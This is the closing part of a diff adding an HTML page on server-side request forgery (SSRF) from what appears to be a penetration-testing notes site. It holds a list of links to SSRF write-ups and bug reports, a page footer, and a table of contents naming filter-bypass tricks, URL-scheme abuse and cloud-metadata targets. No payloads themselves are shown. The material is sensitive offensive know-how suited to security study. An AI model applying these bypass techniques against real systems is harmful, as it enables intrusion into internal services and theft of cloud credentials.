+  <a href="https://hackerone.com/reports/115748">SSRF in https://imgur.com/vidgif/url</a></li>
+<li>
+  <a href="https://hackerone.com/reports/358119">SSRF in proxy.duckduckgo.com</a></li>
+<li>
+  <a href="https://hackerone.com/reports/374737">Blind SSRF on errors.hackerone.net</a></li>
+<li>
+  <a href="https://hackerone.com/reports/382612">SSRF on *shopifycloud.com</a></li>
+<li>
+  <a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">Hackerone - How To: Server-Side Request Forgery (SSRF)</a></li>
+<li>
+  <a href="https://twitter.com/albinowax/status/890725759861403648">Awesome URL abuse for SSRF by @orange_8361 #BHUSA</a></li>
+<li>
+  <a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai</a></li>
+<li>
+  <a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">SSRF Tips - xl7dev</a></li>
+<li>
+  <a href="https://hackerone.com/reports/115748">SSRF in https://imgur.com/vidgif/url</a></li>
+<li>
+  <a href="https://www.dailysecurity.fr/server-side-request-forgery/">Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat</a></li>
+<li>
+  <a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf">AppSecEU15 Server side browsing considered harmful - @Agarri</a></li>
+<li>
+  <a href="https://twitter.com/EdOverflow">Enclosed alphanumerics - @EdOverflow</a></li>
+<li>
+  <a href="http://www.sxcurity.pro/2017/12/17/hackertarget/">Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity</a></li>
+<li>
+  <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">PHP SSRF @secjuice</a></li>
+<li>
+  <a href="https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158">How I convert SSRF to xss in a ssrf vulnerable Jira</a></li>
+<li>
+  <a href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">Piercing the Veil: Server Side Request Forgery to NIPRNet access</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=66ni2BTIjS8">Hacker101 SSRF</a></li>
+<li>
+  <a href="https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/">SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例</a></li>
+<li>
+  <a href="https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978">SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019</a></li>
+<li>
+  <a href="https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/">SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst</a></li>
+<li>
+  <a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang</a></li>
+<li>
+  <a href="https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/">Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure</a></li>
+<li>
+  <a href="https://portswigger.net/web-security/ssrf">PortSwigger - Web Security Academy Server-side request forgery (SSRF)</a></li>
+<li>
+  <a href="https://github.com/allanlw/svg-cheatsheet">SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019</a></li>
+<li>
+  <a href="https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/">SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019</a></li>
+<li>
+  <a href="https://www.kieranclaessens.be/cscbe-web-2018.html">challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!</a></li>
+<li>
+  <a href="https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/">Attacking Url&rsquo;s in JAVA</a></li>
+<li>
+  <a href="https://twitter.com/thedawgyg/status/1224547692967342080">SSRF: Don&rsquo;t encode entire IP</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/server_side_request_forgery.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#server-side-request-forgery">Server-Side Request Forgery</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#payloads-with-localhost">Payloads with localhost</a></li>
+        <li><a href="#bypassing-filters">Bypassing filters</a>
+          <ul>
+            <li><a href="#bypass-using-https">Bypass using HTTPS</a></li>
+            <li><a href="#bypass-localhost-with-">Bypass localhost with [::]</a></li>
+            <li><a href="#bypass-localhost-with-a-domain-redirection">Bypass localhost with a domain redirection</a></li>
+            <li><a href="#bypass-localhost-with-cidr">Bypass localhost with CIDR</a></li>
+            <li><a href="#bypass-using-a-decimal-ip-location">Bypass using a decimal IP location</a></li>
+            <li><a href="#bypass-using-octal-ip">Bypass using octal IP</a></li>
+            <li><a href="#bypass-using-ipv6ipv4-address-embedding">Bypass using IPv6/IPv4 Address Embedding</a></li>
+            <li><a href="#bypass-using-malformed-urls">Bypass using malformed urls</a></li>
+            <li><a href="#bypass-using-rare-address">Bypass using rare address</a></li>
+            <li><a href="#bypass-using-url-encoding">Bypass using URL encoding</a></li>
+            <li><a href="#bypass-using-bash-variables">Bypass using bash variables</a></li>
+            <li><a href="#bypass-using-tricks-combination">Bypass using tricks combination</a></li>
+            <li><a href="#bypass-using-enclosed-alphanumerics">Bypass using enclosed alphanumerics</a></li>
+            <li><a href="#bypass-using-unicode">Bypass using unicode</a></li>
+            <li><a href="#bypass-filter_var-php-function">Bypass filter_var() php function</a></li>
+            <li><a href="#bypass-against-a-weak-parser">Bypass against a weak parser</a></li>
+            <li><a href="#bypassing-using-a-redirect">Bypassing using a redirect</a></li>
+            <li><a href="#bypassing-using-typeurl">Bypassing using type=url</a></li>
+            <li><a href="#bypassing-using-dns-rebinding-toctou">Bypassing using DNS Rebinding (TOCTOU)</a></li>
+            <li><a href="#bypassing-using-jar-protocol-java-only">Bypassing using jar protocol (java only)</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-exploitation-via-url-scheme">SSRF exploitation via URL Scheme</a>
+          <ul>
+            <li><a href="#file">File</a></li>
+            <li><a href="#http">HTTP</a></li>
+            <li><a href="#dict">Dict</a></li>
+            <li><a href="#sftp">SFTP</a></li>
+            <li><a href="#tftp">TFTP</a></li>
+            <li><a href="#ldap">LDAP</a></li>
+            <li><a href="#gopher">Gopher</a></li>
+            <li><a href="#netdoc">Netdoc</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-exploiting-wsgi">SSRF exploiting WSGI</a></li>
+        <li><a href="#ssrf-exploiting-redis">SSRF exploiting Redis</a></li>
+        <li><a href="#ssrf-exploiting-pdf-file">SSRF exploiting PDF file</a></li>
+        <li><a href="#blind-ssrf">Blind SSRF</a></li>
+        <li><a href="#ssrf-to-xss">SSRF to XSS</a></li>
+        <li><a href="#ssrf-from-xss">SSRF from XSS</a>
+          <ul>
+            <li><a href="#using-an-iframe">Using an iframe</a></li>
+            <li><a href="#using-an-attachment">Using an attachment</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-url-for-cloud-instances">SSRF URL for Cloud Instances</a>
+          <ul>
+            <li><a href="#ssrf-url-for-aws-bucket">SSRF URL for AWS Bucket</a></li>
+            <li><a href="#ssrf-url-for-aws-ecs">SSRF URL for AWS ECS</a></li>
+            <li><a href="#ssrf-url-for-aws-elastic-beanstalk">SSRF URL for AWS Elastic Beanstalk</a></li>
+            <li><a href="#ssrf-url-for-aws-lambda">SSRF URL for AWS Lambda</a></li>
+            <li><a href="#ssrf-url-for-google-cloud">SSRF URL for Google Cloud</a></li>
+            <li><a href="#ssrf-url-for-digital-ocean">SSRF URL for Digital Ocean</a></li>
+            <li><a href="#ssrf-url-for-packetcloud">SSRF URL for Packetcloud</a></li>
+            <li><a href="#ssrf-url-for-azure">SSRF URL for Azure</a></li>
+            <li><a href="#ssrf-url-for-openstackrackspace">SSRF URL for OpenStack/RackSpace</a></li>
+            <li><a href="#ssrf-url-for-hp-helion">SSRF URL for HP Helion</a></li>
+            <li><a href="#ssrf-url-for-oracle-cloud">SSRF URL for Oracle Cloud</a></li>
+            <li><a href="#ssrf-url-for-alibaba">SSRF URL for Alibaba</a></li>
+            <li><a href="#ssrf-url-for-kubernetes-etcd">SSRF URL for Kubernetes ETCD</a></li>
+            <li><a href="#ssrf-url-for-docker">SSRF URL for Docker</a></li>
+            <li><a href="#ssrf-url-for-rancher">SSRF URL for Rancher</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
